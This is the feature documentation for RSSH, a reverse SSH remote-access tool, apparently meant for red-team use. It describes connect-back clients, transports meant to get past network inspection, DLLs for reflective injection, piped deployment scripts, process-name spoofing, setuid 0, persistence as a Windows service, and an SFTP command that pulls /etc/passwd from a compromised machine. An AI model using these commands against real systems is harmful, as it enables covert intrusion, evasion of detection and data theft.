# Feature List

This is everything that the RSSH client and server can do in one place. 

If you're looking for **configuration instructions**,  check the [client](client/) or [server](server/) folders.

- [Feature List](#feature-list)
  - [Both](#both)
    - [Log Verbosity](#log-verbosity)
    - [Log Redirection](#log-redirection)
    - [Killing Clients](#killing-clients)
    - [Alternate Transports](#alternate-transports)
  - [Server](#server)
    - [Building and Serving Binaries](#building-and-serving-binaries)
    - [Windows DLL Generation](#windows-dll-generation)
    - [User privileges](#user-privileges)
    - [Deployment Script generation](#deployment-script-generation)
    - [Server control port forwarding QOL](#server-control-port-forwarding-qol)
    - [Topography map](#topography-map)
    - [Shell autocompletions](#shell-autocompletions)
    - [Webhook integrations](#webhook-integrations)
    - [Watching client connections](#watching-client-connections)
    - [Listing currently connected users](#listing-currently-connected-users)
  - [Client](#client)
    - [Backgrounding](#backgrounding)
    - [Shared Library Mode](#shared-library-mode)
    - [Load Server Address / Fingerprint from File](#load-server-address--fingerprint-from-file)
    - [File Transfer (SFTP)](#file-transfer-sftp)
    - [Kerberos / NTLM Auth](#kerberos--ntlm-auth)
    - [Automatic connect-back](#automatic-connect-back)
    - [`CONNECT` Proxy](#connect-proxy)
    - [Changing process name](#changing-process-name)
    - [Change SSH version string](#change-ssh-version-string)
    - [Makefile variable embedding](#makefile-variable-embedding)
    - [SSH Subsystems](#ssh-subsystems)
      - [All](#all)
      - [Linux](#linux)
        - [`setgid`](#setgid)
        - [`setuid`](#setuid)
      - [Windows](#windows)
        - [`service`](#service)
    - [Windows Service Integration](#windows-service-integration)
    - [Full Windows Shell Support](#full-windows-shell-support)


## Both

### Log Verbosity

The server and client both support increasing or decreasing their log levels.

|  Level |  Purpose |
|---|---|
|  INFO |  Print all log messages, including joining/leaving and connection information | 
|  WARNING | Only print things that need attention | 
|   ERROR|  Print things that have caused an unrecoverable state | 
|FATAL| Only output when something has caused the client to crash|
|DISABLED| Print nothing and be happy about it|

### Log Redirection

The RSSH server console command `log` can instruct the RSSH client to either write its log to a file, or to the server console. 
This can be incredibly helpful when debugging odd client behavior/AV tool blocking.

### Killing Clients
The server console command `kill` can be used to pattern kill multiple, or singular clients.

### Alternate Transports
The reverse SSH server and client both support multiple transports for when deep packet inspection blocks `SSH` outbound from a host or network. 
You can either specify the connect back scheme manually by specifying it as a url in the client. 

E.g
```sh
./client -d ws://your.rssh.server:3232
```

Or by baking it in with the `link` command. 
```sh
ssh your.rssh.server -p 3232 link --ws --name test
```

| Transport | Purpose | How |
| -- | -- | -- |
| Websockets |  For getting through strict HTTP proxies | Using the stdlib golang websocket proxy the client inits a raw connection then sends SSH bytes over it| 
| TLS | Just to appear more like regular network traffic rather than SSH | Server side either uses certs, or generates a cert, then the client just connects in insecure mode (not checking certs) and does auth in the SSH layer | 
| HTTP Polling | For when you have a very aggressive HTTP proxy that only allows HTTP requests  | Effectively sends `POST` and `GET` requests to the RSSH server to transfer data. |
| STDIO / Inetd| Use stdin and stdout as our network socket | When you have to reuse an open socket to get data out. [More details](https://github.com/NHAS/reverse_ssh/issues/149 )| 

## Server

### Building and Serving Binaries

The RSSH server has a console command `link` that allows you to build a binary with various options and then host it on a TCP/HTTP server.

Check the [reference](./server/console_reference.md) for more details.

### Windows DLL Generation

You can compile the client as a `DLL` to be loaded with something like [Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1). 
Which is useful for fileless injections, malicious DLL loading issues and more..

This will need a cross compiler if you are doing this on linux, use `mingw-w64-gcc`, this is included in the docker release.

```bash
# Using the link command
catcher$ link --goos windows --shared-object --name windows_dll
http://your.rssh.server.internal:3232/windows_dll

# If building manually
CC=x86_64-w64-mingw32-gcc GOOS=windows RSSH_HOMESERVER=192.168.1.1:2343 make client_dll
```

### User privileges 

If you want to run a multi-user server were all users are not entirely trusted with all clients you can set up access privileges. 

By putting the users keys in the `{datadir}/keys/$USERNAME` you can restrict the powers that a user may have. 

Then you can share various clients with the `access` command, and the `--owner` `link` command flag.

### Deployment Script generation

When using the `link` command, any link created can have `.sh`, `.py` or `.ps1` (pr's welcome to expand this list) appended to them. Which causes the server to generate a script ready to be piped into a welcoming shell.


### Server control port forwarding QOL 

Using the `listen` command you can easily forward the server control port to your connected clients. This is so you dont have to manually use SSH syntax to work out how to reach nested clients.

### Topography map
The server console supports showing how nested your clients are. Using the `map` command if an RSSH client has the servers control port forwarded with the `listen` command you can see the chain of sub clients. 


### Shell autocompletions
The RSSH server supports adding shell completions, so you can easily cycle through RSSH clients without having to use the server console. 

Check out the `autocomplete` command in the [reference](./server/console_reference.md)

### Webhook integrations
Using the `webhook` command you can set the RSSH server to send HTTP requests containing RSSH client activity. I.e whether they are joining or leaving. 

### Watching client connections
The `watch` command allows you to watch client activity within the server SSH console. Similar to the webhook integration.

### Listing currently connected users
Useful when you need to bring the server down for some reason the `who` command will show you the reported username to public key.


## Client

### Backgrounding

When an RSSH client is started it tries its best to detach itself from the parent process so that if the parent gets killed, or finishes it doesnt end the RSSH client process. 

On linux this is done re-executing the binary then creating a new process group and ignoring any hangup signals that could be thrown. 

Windows is more complicated. If the process detects it is running as a windows service it installs itself by responding to the service requests, otherwise it just runs plain.

### Shared Library Mode

The RSSH client can be built as a shared library for both windows (`.dll`) and linux (`.so`). On windows when the client is loaded as a DLL it uses `rundll32.exe` to start a new process during `PROCESS_ATTACH`. 

On linux it just runs on init.

### Load Server Address / Fingerprint from File

Using `--destination-file` / `--fingerprint-file` you can load the server address from a file. This can be helpful for automating deployments where the address is not known in advance.

### File Transfer (SFTP)
When an RSSH client binary is running on a machine you can use regular SFTP commands to copy files to and from that machine. 

e.g 

```sh
sfp -J rssh.server:3232 <client_id> /etc/passwd . 
```

This has some complexities on windows, checkout [troubleshooting.md](./troubleshooting.md) for more.

### Kerberos / NTLM Auth
The RSSH client can use either kerberos or NTLM auth material when connecting to a proxy. You can check out the client reference for how to configure this.

### Automatic connect-back

The rssh client allows you to bake in a connect back address.
By default the `link` command will bake in the servers external address.

When manually building the binary, specify the server address in the `RSSH_HOMESERVER` environment variable:

```sh
$ RSSH_HOMESERVER=your.rssh.server.internal:3232 make

# Will connect to your.rssh.server.internal:3232, even though no destination is specified
$ bin/client

# Behaviour is otherwise normal; will connect to the supplied host, e.g example.com:3232
$ bin/client -d example.com:3232
```

### `CONNECT` Proxy 

The RSSH client supports navigating through a HTTP connect proxy.

### Changing process name
`--process-name` The RSSH binary can change what name is listed in the process list. 

### Change SSH version string

As the SSH version given by an SSH client is cleartext and the RSSH version is in a very detectable format you may need to change it occasionally. 

You can do this using `--version-string` 

### Makefile variable embedding

You can set variables in the RSSH binary on make. Check the [configuration](./client/configuration.md) for more details.



### SSH Subsystems

The SSH protocol supports calling subsystems with the `-s` flag. In RSSH this is repurposed to provide special commands for platforms, and `sftp` support.


e.g

```sh
# Install the rssh binary as a service (windows only)
ssh -J your.rssh.server.internal:3232 test-pc.user.test-pc -s service --install

# Instruct the RSSH client to attempt to change its gid/uid
ssh -J your.rssh.server.internal:3232 linux-injected-machine -s setgid 0
ssh -J your.rssh.server.internal:3232 linux-injected-machine -s setuid 0

# List subsystems available in this client
ssh -J your.rssh.server.internal:3232 test-pc.user.test-pc -s list

```

#### All

`list`  Lists avaiable subsystem

`sftp`: Runs the sftp handler to transfer files

#### Linux

##### `setgid`
Attempt to change group

#####  `setuid`
Attempt to change user

#### Windows

#####  `service`
Installs or removes the rssh binary as a windows service, requires administrative rights


### Windows Service Integration

The client RSSH binary supports being run as windows service. 

### Full Windows Shell Support

This project uses `conpty` on current versions of windows, and `winpty` library on older versions. This should mean that the RSSH client on almost all versions of windows will net you a nice shell.

It is still quite challenging to capture all output for some Powershell applets. If you start a command that doesnt seem to end, it may be that it is asking for input in a way that you cannot see. 
